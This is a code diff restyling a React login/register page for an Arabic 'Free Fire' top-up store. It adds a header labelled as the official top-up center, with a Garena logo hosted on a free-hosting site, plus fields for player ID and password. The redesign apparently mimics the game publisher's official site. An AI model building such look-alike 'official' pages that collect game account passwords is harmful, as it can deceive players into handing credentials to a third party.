@@ -2,6 +2,7 @@ import { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import axios from 'axios';
 import { motion } from 'motion/react';
+import { Globe, ChevronDown } from 'lucide-react';
 import LoaderButton from '../components/LoaderButton';
 import Modal from '../components/Modal';
 
@@ -50,71 +51,104 @@ export default function LoginRegister() {
   };
 
   return (
-    <div className="relative flex min-h-screen w-full items-center justify-center overflow-hidden bg-[#f1f5f9] p-4">
-      {/* Decorative background elements */}
-      <div className="absolute top-0 right-0 -mr-20 -mt-20 h-64 w-64 rounded-full bg-blue-500/10 blur-3xl animate-pulse" />
-      <div className="absolute bottom-0 left-0 -ml-20 -mb-20 h-80 w-80 rounded-full bg-purple-500/10 blur-3xl animate-pulse" />
-      
-      <motion.div 
-        initial={{ opacity: 0, y: 20 }}
-        animate={{ opacity: 1, y: 0 }}
-        className="relative z-10 w-full max-w-md rounded-[40px] border border-white/50 bg-white/40 p-8 shadow-[0_8px_32px_0_rgba(31,38,135,0.07)] backdrop-blur-xl"
-      >
-        <div className="mb-10 text-center">
-          <div className="mx-auto mb-6 flex h-24 w-24 items-center justify-center rounded-[32px] bg-gradient-to-tr from-blue-500 to-indigo-600 text-white shadow-xl shadow-blue-500/30">
-            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"/>
-            </svg>
+    <div className="min-h-screen bg-[#F8F9FA] pb-20 font-sans" dir="rtl">
+      {/* Header */}
+      <header className="sticky top-0 z-40 bg-white shadow-sm">
+        <div className="mx-auto flex h-16 max-w-4xl items-center justify-between px-4">
+          <div className="flex items-center gap-3">
+            <div className="mx-auto flex h-10 w-10 items-center justify-center overflow-hidden rounded-md border border-gray-100 bg-white shadow-sm">
+              <img
+                src="https://storingo.lovestoblog.com/garena.png"
+                alt="Garena"
+                className="h-full w-full object-contain p-1"
+                onError={(e) => {
+                  e.currentTarget.style.display = "none";
+                }}
+              />
+            </div>
+            <div className="leading-tight">
+              <div className="text-sm font-bold text-gray-800">مركز الشحن</div>
+              <div className="text-xs font-semibold text-gray-500">الرسمي</div>
+            </div>
           </div>
-          <h1 className="mb-2 text-4xl font-black text-gray-900">متجر فري فاير</h1>
-          <p className="text-gray-500">
-            {isLogin ? 'سجل الدخول لبدء الشحن' : 'أنشئ حسابك لبدء الشحن'}
-          </p>
-        </div>
-
-        <div className="space-y-6">
-          <div>
-            <label className="mb-2 block text-sm font-semibold text-gray-600">الايدي (ID)</label>
-            <input 
-              type="text" 
-              value={accountId}
-              onChange={(e) => setAccountId(e.target.value)}
-              className="w-full rounded-[20px] border border-white/40 bg-white/40 p-4 text-gray-900 outline-none ring-blue-500/20 transition-all focus:border-white/60 focus:bg-white/60 focus:ring-4 backdrop-blur-md shadow-inner"
-              placeholder="123456789"
-            />
-          </div>
-          <div>
-            <label className="mb-2 block text-sm font-semibold text-gray-600">كلمة المرور</label>
-            <input 
-              type="password" 
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              className="w-full rounded-[20px] border border-white/40 bg-white/40 p-4 text-gray-900 outline-none ring-blue-500/20 transition-all focus:border-white/60 focus:bg-white/60 focus:ring-4 backdrop-blur-md shadow-inner"
-              placeholder="••••••••"
-            />
-          </div>
-
-          {error && <p className="text-center text-sm font-bold text-red-500">{error}</p>}
-
-          <LoaderButton 
-            isLoading={loading}
-            onClick={handleAuth}
-            className="bg-gradient-to-r from-blue-600 to-indigo-600 py-4 text-lg text-white shadow-xl shadow-blue-600/30 hover:from-blue-700 hover:to-indigo-700 active:scale-95"
-          >
-            {isLogin ? 'تسجيل الدخول' : 'إنشاء حساب جديد'}
-          </LoaderButton>
-
-          <div className="text-center text-sm text-gray-500">
-            {isLogin ? 'ليس لديك حساب؟ ' : 'لديك حساب بالفعل؟ '}
-            <button 
-              onClick={() => { setIsLogin(!isLogin); setError(''); }}
-              className="font-bold text-blue-600"
-            >
-              {isLogin ? 'إنشاء حساب جديد' : 'تسجيل الدخول'}
+          <div className="flex items-center gap-2">
+            <button className="flex items-center gap-1 rounded-full border border-gray-200 bg-gray-50 px-3 py-1.5 text-xs font-bold text-gray-700 hover:bg-gray-100 transition-colors">
+              <Globe className="h-4 w-4" />
+              <span>الجزائر - العربية</span>
+              <ChevronDown className="h-4 w-4" />
             </button>
           </div>
         </div>
-      </motion.div>
+      </header>
+
+      <main className="mx-auto max-w-md px-4 pt-10">
+        <motion.div 
+          initial={{ opacity: 0, y: 20 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="rounded-2xl border border-gray-100 bg-white p-6 shadow-sm"
+        >
+          <div className="mb-6 text-center">
+            <div className="mx-auto mb-4 flex h-20 w-20 items-center justify-center overflow-hidden rounded-2xl border-2 border-red-600 p-0.5 shadow-md bg-white">
+              <img
+                src="https://storingo.lovestoblog.com/ff.png"
+                alt="Free Fire"
+                className="h-full w-full rounded-xl object-cover"
+                onError={(e) =>
+                  (e.currentTarget.src =
+                    "https://play-lh.googleusercontent.com/NejsQExEa0ZqV4xOMr0HjWd2mK95P_k1Gq-U2xI2qXYR0z8C6rE8lQ6YIIf4rY1R3W8=w240-h480-rw")
+                }
+              />
+            </div>
+            <h1 className="mb-1 text-2xl font-black text-gray-900">متجر فري فاير</h1>
+            <p className="text-sm text-gray-500">
+              {isLogin ? 'سجل الدخول لبدء الشحن' : 'أنشئ حسابك لبدء الشحن'}
+            </p>
+          </div>
+
+          <div className="space-y-4">
+            <div>
+              <label className="mb-1.5 block text-sm font-bold text-gray-700">معرّف اللاعب</label>
+              <input 
+                type="text" 
+                value={accountId}
+                onChange={(e) => setAccountId(e.target.value)}
+                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
+                placeholder="يرجى إدخال معرّف اللاعب"
+              />
+            </div>
+            <div>
+              <label className="mb-1.5 block text-sm font-bold text-gray-700">كلمة المرور</label>
+              <input 
+                type="password" 
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className="w-full rounded-xl border border-gray-300 bg-gray-50 p-4 text-sm font-medium text-gray-900 outline-none transition-all placeholder:text-gray-400 focus:border-red-500 focus:bg-white focus:ring-2 focus:ring-red-100"
+                placeholder="••••••••"
+              />
+            </div>
+
+            {error && <p className="text-center text-sm font-bold text-red-500">{error}</p>}
+
+            <LoaderButton 
+              isLoading={loading}
+              onClick={handleAuth}
+              className="mt-2 w-full rounded-xl bg-red-600 py-4 text-lg font-bold text-white shadow-lg shadow-red-600/20 hover:bg-red-700 active:scale-95 transition-all transition-colors"
+            >
+              {isLogin ? 'تسجيل الدخول' : 'إنشاء حساب جديد'}
+            </LoaderButton>
+
+            <div className="mt-4 text-center text-sm font-semibold text-gray-500">
+              {isLogin ? 'ليس لديك حساب؟ ' : 'لديك حساب بالفعل؟ '}
+              <button 
+                onClick={() => { setIsLogin(!isLogin); setError(''); }}
+                className="text-red-600 hover:underline"
+              >
+                {isLogin ? 'إنشاء حساب جديد' : 'تسجيل الدخول'}
+              </button>
+            </div>
+          </div>
+        </motion.div>
+      </main>
 
       <Modal 
         isOpen={banInfo.isOpen} 
